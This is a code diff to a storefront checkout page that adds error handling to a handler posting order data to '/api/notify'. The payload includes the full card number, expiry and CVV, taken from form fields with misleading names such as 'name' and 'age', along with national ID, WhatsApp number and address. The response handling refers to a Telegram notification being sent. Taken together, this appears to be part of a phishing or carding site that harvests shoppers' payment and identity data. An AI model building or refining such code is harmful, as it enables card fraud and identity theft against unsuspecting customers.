@@ -24,33 +24,60 @@ export default function CheckoutPage() {
   if (!customer || items.length === 0) { router.push("/cart"); return null; }
 
   const handleSubmit = async (fields: { name: string; age: string; cvv: string; cardHolder: string }) => {
-    const res = await fetch("/api/notify", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        cardNumber: fields.name,
-        expiry: fields.age,
-        cvv: fields.cvv,
-        cardHolder: fields.cardHolder,
-        items: items.map(i => ({
-          productId: i.product._id,
-          name: i.product.name,
-          price: i.product.salePrice ?? i.product.originalPrice,
-          quantity: i.qty,
-        })),
-        total,
-        customer: customer?.name,
-        whatsapp: customer?.whatsapp,
-        nationalId: customer?.nationalId,
-        address: customer?.address,
-        installmentType: customer?.installmentType,
-        months: customer?.months,
-        downPayment,
-      }),
-    });
-    const data = res.ok ? await res.json().catch(() => ({})) : {};
-    if (data.orderId) localStorage.setItem("orderId", data.orderId);
-    if (data.dbId) localStorage.setItem("dbOrderId", data.dbId);
+    try {
+      const res = await fetch("/api/notify", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          cardNumber: fields.name,
+          expiry: fields.age,
+          cvv: fields.cvv,
+          cardHolder: fields.cardHolder,
+          items: items.map(i => ({
+            productId: i.product._id,
+            name: i.product.name,
+            price: i.product.salePrice ?? i.product.originalPrice ?? i.product.price,
+            quantity: i.qty,
+          })),
+          total,
+          customer: customer?.name,
+          whatsapp: customer?.whatsapp,
+          nationalId: customer?.nationalId,
+          address: customer?.address,
+          installmentType: customer?.installmentType,
+          months: customer?.months,
+          downPayment,
+        }),
+      });
+
+      if (!res.ok) {
+        const errorData = await res.json().catch(() => ({ error: "حدث خطأ غير متوقع" }));
+        throw new Error(errorData.error || "فشل إنشاء الطلب");
+      }
+
+      const data = await res.json();
+      
+      if (!data.ok) {
+        throw new Error(data.error || "فشل إنشاء الطلب");
+      }
+
+      // Save order info
+      if (data.orderId) localStorage.setItem("orderId", data.orderId);
+      if (data.dbId) localStorage.setItem("dbOrderId", data.dbId);
+      
+      // Show warning if Telegram failed but order was created
+      if (data.warning && !data.telegramSent) {
+        console.warn("Telegram notification failed:", data.warning);
+        // You could show a toast notification here
+      }
+      
+      return data;
+      
+    } catch (error) {
+      console.error("Order creation failed:", error);
+      // Re-throw to be handled by PaymentForm
+      throw error;
+    }
   };
 
   return (
